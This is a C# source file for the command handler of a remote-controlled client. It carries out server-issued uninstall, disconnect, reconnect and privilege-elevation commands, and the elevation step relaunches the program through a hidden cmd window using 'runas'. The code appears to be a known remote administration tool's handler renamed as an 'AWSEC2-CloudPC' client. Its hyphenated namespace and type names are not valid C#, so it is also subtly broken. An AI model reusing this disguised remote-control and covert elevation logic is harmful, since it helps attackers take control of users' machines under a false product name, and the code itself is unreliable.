using AWSEC2-CloudPC.Client.Config;
using AWSEC2-CloudPC.Client.Networking;
using AWSEC2-CloudPC.Client.Setup;
using AWSEC2-CloudPC.Client.User;
using AWSEC2-CloudPC.Client.Utilities;
using AWSEC2-CloudPC.Common.Enums;
using AWSEC2-CloudPC.Common.Messages;
using AWSEC2-CloudPC.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace AWSEC2-CloudPC.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly AWSEC2-CloudPCClient _client;

        private readonly AWSEC2-CloudPCApplication _application;

        public ClientServicesHandler(AWSEC2-CloudPCApplication application, AWSEC2-CloudPCClient client)
        {
            _application = application;
            _client = client;
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already elevated." });
            }
        }
    }
}
